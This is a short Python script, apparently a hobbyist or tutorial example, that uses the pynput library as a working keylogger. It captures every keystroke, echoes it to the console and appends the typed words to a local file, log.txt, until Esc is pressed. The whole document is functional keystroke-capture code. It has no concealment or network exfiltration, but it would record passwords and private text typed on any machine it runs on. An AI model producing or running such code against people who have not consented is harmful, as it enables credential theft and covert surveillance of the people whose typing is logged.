import pynput
from pynput.keyboard import Key, Listener

charcount = 0
keys = []

def onkeypress(key):
    try:
        print("Key Pressed : ", key)
    except Exception as ex:
        print('There was an error : ', ex)


def onkeyrelease(key):
    global keys, charcount 
    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            writetofile(keys)
            charcount = 0
            keys = []
        elif key == Key.space:
            key = ' '
            writetofile(keys)
            keys = []
            charcount = 0
        keys.append(key)
        charcount += 1


def writetofile(Keys):
    with open('log.txt', 'a') as file :
        for key in keys:
            key = str(key).replace("'","")
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")

with Listener(on_press=onkeypress, on_release=onkeyrelease) as listener:
    listener.join()